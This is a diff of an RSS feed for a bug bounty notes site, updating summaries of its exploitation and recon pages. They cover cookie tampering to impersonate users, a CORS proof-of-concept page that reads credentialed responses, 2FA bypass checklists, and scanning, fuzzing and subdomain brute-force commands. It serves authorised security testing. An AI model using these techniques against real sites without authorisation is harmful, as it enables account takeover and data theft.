@@ -143,7 +143,8 @@ A website is vulnerable if:
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/cookieattacks/</guid>
-      <description>Cookie Based Attacls #  Cookies Explained #  https://cookiepedia.co.uk/</description>
+      <description>Cookie Based Attacls #  Cookies Explained #  https://cookiepedia.co.uk/
+Attacks #   Check for PII or sensitive in cookie data Add a very long cookie value, it may ddos the application If cookies hold a serialized object, try insecure deserialization Chain CRLF Injection to add cookies (look for XSS or SQL) Check if session expires on logout  Decoding the cookie #  If the cookie is using some Base encoding (like Base64) or similar you may be able to decode it, change the content and impersonate arbitrary users</description>
     </item>
     
     <item>
@@ -152,7 +153,7 @@ A website is vulnerable if:
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/cors/</guid>
-      <description>CORS #  # https://github.com/s0md3v/Corsy python3 corsy.py -u https://example.com POC #  Simple #  &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;CORS PoC Exploit&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;center&amp;gt; &amp;lt;h1&amp;gt;CORS Exploit&amp;lt;br&amp;gt;six2dez&amp;lt;/h1&amp;gt; &amp;lt;hr&amp;gt; &amp;lt;div id=&amp;quot;demo&amp;quot;&amp;gt; &amp;lt;button type=&amp;quot;button&amp;quot; onclick=&amp;quot;cors()&amp;quot;&amp;gt;Exploit&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt; function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if(this.readyState == 4 &amp;amp;&amp;amp; this.status == 200) { document.getElementById(&amp;quot;demo&amp;quot;).innerHTML = this.responseText; } }; xhttp.open(&amp;quot;GET&amp;quot;, &amp;quot;http://&amp;lt;vulnerable-url&amp;gt;&amp;quot;, true); xhttp.withCredentials = true; xhttp.send(); } &amp;lt;/script&amp;gt; &amp;lt;/center&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; Simple with headers #  &amp;lt;html&amp;gt; &amp;lt;script&amp;gt; var http = new XMLHttpRequest(); var url = &#39;Url&#39;;//Paste here Url var params = &#39;PostData&#39;;//Paste here POST data http.</description>
+      <description>CORS #  # https://github.com/s0md3v/Corsy python3 corsy.py -u https://example.com POC #  Simple #  &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;CORS PoC Exploit&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;center&amp;gt; &amp;lt;h1&amp;gt;CORS Exploit&amp;lt;br&amp;gt;six2dez&amp;lt;/h1&amp;gt; &amp;lt;hr&amp;gt; &amp;lt;div id=&amp;#34;demo&amp;#34;&amp;gt; &amp;lt;button type=&amp;#34;button&amp;#34; onclick=&amp;#34;cors()&amp;#34;&amp;gt;Exploit&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;script type=&amp;#34;text/javascript&amp;#34;&amp;gt; function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if(this.readyState == 4 &amp;amp;&amp;amp; this.status == 200) { document.getElementById(&amp;#34;demo&amp;#34;).innerHTML = this.responseText; } }; xhttp.open(&amp;#34;GET&amp;#34;, &amp;#34;http://&amp;lt;vulnerable-url&amp;gt;&amp;#34;, true); xhttp.withCredentials = true; xhttp.send(); } &amp;lt;/script&amp;gt; &amp;lt;/center&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; Simple with headers #  &amp;lt;html&amp;gt; &amp;lt;script&amp;gt; var http = new XMLHttpRequest(); var url = &amp;#39;Url&amp;#39;;//Paste here Url var params = &amp;#39;PostData&amp;#39;;//Paste here POST data http.</description>
     </item>
     
     <item>
@@ -215,7 +216,9 @@ POST /api/get_profile Content-Type: application/json {“user_id”:&amp;lt;legi
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/javascriptfiles/</guid>
-      <description>Javascript Files #  Linters #   JSHint  Download #    JSScanner
+      <description>Javascript Files #  Linters #   JSHint  Download #    getJS
+Download all js files for each site https://github.com/003random/getJS
+  JSScanner
 Download all js files for each site, beautify and run linkfinder: https://github.com/dark-warlord14/JSScanner
   JSBeat
 Download all js files for each site and beautify: https://github.com/felipecaon/BugBountyStuff/blob/main/scripts/jsbeat.py
@@ -237,7 +240,7 @@ Download all js files for each site and beautify: https://github.com/felipecaon/
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/oauth/</guid>
-      <description>Broken Authentication #  </description>
+      <description>OAuth 2 #  </description>
     </item>
     
     <item>
@@ -294,7 +297,7 @@ Social Media Share Links #  Often a websites offers its user a feature to share 
       
       <guid>https://caon.io/docs/exploitation/requestsmuggling/</guid>
       <description>Request Smuggling #  It&amp;rsquo;s far more easier to search for articles explaining this concept.
-Tools #   HTTP Request Smuggler, Burp extension  # https://github.com/defparam/smuggler python3 smuggler.py -u &amp;lt;URL&amp;gt; Articles #   https://portswigger.net/web-security/request-smuggling https://cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling https://paper.seebug.org/1049/  </description>
+Tools #   HTTP Request Smuggler, Burp extension  # https://github.com/defparam/smuggler python3 smuggler.py -u &amp;lt;URL&amp;gt; Articles #   https://portswigger.net/web-security/request-smuggling https://cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling https://paper.seebug.org/1049/  Exploitation #   Bring impact by reporting smuggling chained with host injection. Users should make simple request with your injected header.  </description>
     </item>
     
     <item>
@@ -334,7 +337,7 @@ http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/user-data
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/twofa/</guid>
-      <description>Two factor Authentication #  Bypasses #   Response Manipulation (Intercept Response and change it to 200, falses to trues&amp;hellip;) 2FA Code Reusability 2FA Code Leakage in Response Password Reset Disable 2FA CSRF on 2FA Disabling Lack of Brute-Force Protection Clickjacking on 2FA Disabling Page Enabling 2FA doesn&amp;rsquo;t expire Previously active Sessions Bypass 2FA with null or 000000  </description>
+      <description>Two factor Authentication #  Bypasses #   Response Manipulation (Intercept Response and change it to 200, falses to trues&amp;hellip;) 2FA Code Reusability 2FA Code Leakage in Response Password Reset Disable 2FA CSRF on 2FA Disabling Lack of Brute-Force Protection Clickjacking on 2FA Disabling Page Enabling 2FA doesn&amp;rsquo;t expire Previously active Sessions Bypass 2FA with null or 000000 Direct access to a page, jump 2FA process 2FA code based on timestamp  </description>
     </item>
     
     <item>
@@ -380,7 +383,10 @@ AWS signature #  Authorization: AWS4-HMAC-SHA256 Credential=abc/20200618/us-east
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/xss/</guid>
-      <description>XSS #  # https://github.com/hahwul/dalfox dalfox url http://example.com cat urls | dalfox pipe # https://github.com/KathanP19/Gxss cat list | Gxss -c 100 -p REPLACE_STRING    URL Description     https://xss.pwnfunction.com/ pwnfunction XSS games    </description>
+      <description>XSS #  # https://github.com/hahwul/dalfox dalfox url http://example.com cat urls | dalfox pipe Find reflected parameters that could lead to XSS with Gxss
+# https://github.com/KathanP19/Gxss cat list | Gxss -c 100 -p REPLACE_STRING Semgrep #  Semgrep can be used to detect sink and sources and assist in XSS detection.
+Usage #  Download javascript files and beautify them (See Javascript), then run semgrep with
+semgrep -c xss.yaml scripts/* Hold down!</description>
     </item>
     
     <item>
@@ -426,7 +432,9 @@ AWS signature #  Authorization: AWS4-HMAC-SHA256 Credential=abc/20200618/us-east
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/recon/fuzzing/</guid>
-      <description>Fuzzing #  # https://github.com/ffuf/ffuf ffuf -w /path/to/wordlist -u https://target/FUZZ # Multiple sources ffuf -w http-methods:METHOD -w payloads:PAYLOAD -w headers:HEADER -u &amp;quot;https://streetcontxt.com/PAYLOAD&amp;quot; -H &amp;quot;HEADER:127.0.0.1&amp;quot; -X &amp;quot;METHOD&amp;quot; # Multiple URLs and mutiple files example ffuf -u URL/FUZZ -w allipstoffuf:URL -w ~/.config/wordlists/envpath:FUZZ -maxtime 300 -t 500 -c -v #Cool flags -ac: Calibrate requests to unmatch false positives -recursion: recursion -se: Stop on erors -sf: Stop on 95% 403 Forbidden, possible WAF ban Backup Files #  # https://github.</description>
+      <description>Fuzzing #  Rate Limited?
+Try to run techniques from 403 Bypass
+ # https://github.com/ffuf/ffuf ffuf -w /path/to/wordlist -u https://target/FUZZ # Multiple sources ffuf -w http-methods:METHOD -w payloads:PAYLOAD -w headers:HEADER -u &amp;quot;https://example.com/PAYLOAD&amp;quot; -H &amp;quot;HEADER:127.0.0.1&amp;quot; -X &amp;quot;METHOD&amp;quot; # Multiple URLs and mutiple files example ffuf -u URL/FUZZ -w allipstoffuf:URL -w ~/.config/wordlists/envpath:FUZZ -maxtime 300 -t 500 -c -v # Cool ffuf flags -ac: Calibrate requests to unmatch false positives -recursion: recursion -se: Stop on erors -sf: Stop on 95% 403 Forbidden, possible WAF ban Backup Files #  Tempers file to find possible backup files based in file name</description>
     </item>
     
     <item>
@@ -436,7 +444,7 @@ AWS signature #  Authorization: AWS4-HMAC-SHA256 Credential=abc/20200618/us-east
       
       <guid>https://caon.io/docs/recon/paramdiscovery/</guid>
       <description>Parameter Discovery #  There are two tools that I prefer when doing param scanning. X8, which is a tool made just for param discovery with advanced comparison and ffuf, which is a general fuzzing tool that can be used for single param testing.
-# https://github.com/Sh1Yo/x8 x8 -u &amp;quot;https://example.com/&amp;quot; -w &amp;lt;wordlist&amp;gt; # https://github.com/ffuf/ffuf ffuf -w /path/to/paramnames.txt -u https://target/script.php?FUZZ=test_value Param discovering from crawling results #  Given a list with crawled urls, grep the ones that have known parameters and get only the url</description>
+X8 #  # https://github.com/Sh1Yo/x8 x8 -u &amp;quot;https://example.com/&amp;quot; -w &amp;lt;wordlist&amp;gt; ffuf #  # https://github.com/ffuf/ffuf ffuf -w /path/to/paramnames.txt -u https://target/script.php?FUZZ=test_value Param discovering from crawling results #  Given a list with crawled urls, grep the ones that have known parameters and get only the url</description>
     </item>
     
     <item>
@@ -445,7 +453,7 @@ AWS signature #  Authorization: AWS4-HMAC-SHA256 Credential=abc/20200618/us-east
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/recon/portscan/</guid>
-      <description>Port Scan #  # https://github.com/nmap/nmap ./configure make make install # https://github.com/projectdiscovery/naabu naabu -p 80,443,21-23 -host example.com naabu -list hosts.txt cat lists | naabu -silent echo example.com | naabu -nmap-cli &#39;nmap -sC -sV -oX nmap-output&#39; </description>
+      <description>Port Scan #  Nmap #  # https://github.com/nmap/nmap ./configure make make install nmap -sC -sV example.com nmap example.com Naabu #  # https://github.com/projectdiscovery/naabu naabu -p 80,443,21-23 -host example.com naabu -list hosts.txt cat lists | naabu -silent echo example.com | naabu -nmap-cli &#39;nmap -sC -sV -oX nmap-output&#39; </description>
     </item>
     
     <item>
@@ -455,8 +463,8 @@ AWS signature #  Authorization: AWS4-HMAC-SHA256 Credential=abc/20200618/us-east
       
       <guid>https://caon.io/docs/recon/probing/</guid>
       <description>Probing #  Validates a list of urls, checks to see if they are alive or not.
-Two tools were provided, choose the best fit, the do the same thing but in some cases httprobe is faster and resolves more urls correctly.
-# https://github.com/tomnomnom/httprobe/ # go get -u github.com/tomnomnom/httprobe@master cat urls | httprobe --prefer-https | tee -a out # https://github.com/projectdiscovery/httpx # go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest cat urls | httpx -random-agent -retries 2 -o out </description>
+Two tools were provided, choose the best fit, they do the same thing.
+Httprobe #  # https://github.com/tomnomnom/httprobe/ # go get -u github.com/tomnomnom/httprobe@master cat urls | httprobe --prefer-https | tee -a out # HttpX # https://github.com/projectdiscovery/httpx # go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest cat urls | httpx -random-agent -retries 2 -o out </description>
     </item>
     
     <item>
@@ -465,10 +473,9 @@ Two tools were provided, choose the best fit, the do the same thing but in some 
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/recon/scope/</guid>
-      <description>Scope #  As a bug bounty hunter, you may keep a close eye in the scope for the desired program.
-An scope can be defined as the limits of where your research should go, if you ever find a bug, this must reside inside the scope, otherwise, the finding is not valid.
+      <description>Scope #  An scope can be defined as the limits of where your research should go, if you ever find a bug, this must reside inside the scope, otherwise, the finding is not valid.
 Example of scope
-   In-Scope Out of scope     example.com subdomain.example.com   *-dev.</description>
+   In-Scope Out of scope     example.com subdomain.example.com   *-dev.example.com     The scope above states that example.com and www.example.com are valid (www is a subdomain, example.</description>
     </item>
     
     <item>
@@ -477,7 +484,11 @@ Example of scope
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/recon/screenshot/</guid>
-      <description>Screenshot #  # https://github.com/FortyNorthSecurity/EyeWitness EyeWitness -f urls.txt --web # https://github.com/sensepost/gowitness </description>
+      <description>Screenshot #  For large recons where manual website visit is not doable. The program would grab a list of valid urls and screenshot them using a headless browser.
+Hold down!
+A browser must be installed prior using an screenshotter. Chrome or chromium is recommended.
+ EyeWitness #  # https://github.com/FortyNorthSecurity/EyeWitness EyeWitness -f urls.txt --web GoWitness #  # https://github.com/sensepost/gowitness gowitness file -f websites.txt -t &amp;lt;threads&amp;gt; --disable-logging webscreenshot.py
+webscreenshot is Kopfschmerzen</description>
     </item>
     
     <item>
@@ -506,7 +517,7 @@ Example of scope
       <guid>https://caon.io/docs/recon/subdomainenum/subdomainenum_active/</guid>
       <description>Active Resources #  The ideia behind an active subdomain recon is to bruteforce subdomain in order to find anything that is valid.
 Get resolvers at:
-RESOLVER_SOURCE Pure DNS #  # https://github.com/d3mondev/puredns puredns resolve subdomains.txt -r resolvers.txt --write resolved_dns_domains puredns bruteforce subdomains.txt example.com -r resolvers.txt --write resolved_dns_domains Permutations #  # https://github.com/Josue87/gotator gotator -sub subdomains/subdomains.txt -perm permutations_list.txt -depth 1 -numbers 10 -mindup -adv -md </description>
+# https://github.com/felipecaon/resolvers wget https://raw.githubusercontent.com/felipecaon/resolvers/main/resolvers.txt Pure DNS #  # https://github.com/d3mondev/puredns puredns resolve subdomains.txt -r resolvers.txt --write resolved_dns_domains puredns bruteforce subdomains.txt example.com -r resolvers.txt --write resolved_dns_domains Permutations #  # https://github.com/Josue87/gotator gotator -sub subdomains/subdomains.txt -perm permutations_list.txt -depth 1 -numbers 10 -mindup -adv -md </description>
     </item>
     
     <item>
@@ -525,7 +536,7 @@ RESOLVER_SOURCE Pure DNS #  # https://github.com/d3mondev/puredns puredns resolv
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/recon/wafcheck/</guid>
-      <description>WAF Check #  # https://github.com/EnableSecurity/wafw00f wafw00f -i websites.txt </description>
+      <description>WAF Check #  Wafw00f #  # https://github.com/EnableSecurity/wafw00f wafw00f -i websites.txt </description>
     </item>
     
     <item>
@@ -571,7 +582,7 @@ Parameters #  # https://github.com/tomnomnom/anew cat links.txt | unfurl -u keys
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/resources/sites/</guid>
-      <description>Sites #     Link Niche     https://www.hahwul.com/ Blog   https://netsec.expert/ Blog   https://ihorrasch.com/ Blog   https://www.agarri.fr/en Blog   https://www.100security.com.br/ Blog (portuguese)   https://www.hacking8.com/ Blog (chinese)   https://weboas.is/ Link aggregator   https://github.com/ziishaned/learn-regex Learn Regex    </description>
+      <description>Sites #     Link Niche     https://www.hahwul.com/ Blog   https://netsec.expert/ Blog   https://ihorrasch.com/ Blog   https://www.agarri.fr/en Blog   https://www.100security.com.br/ Blog (portuguese)   https://www.hacking8.com/ Blog (chinese)   https://www.rcesecurity.com Blog   https://weboas.is/ Link aggregator   https://github.com/ziishaned/learn-regex Learn Regex    </description>
     </item>
     
     <item>
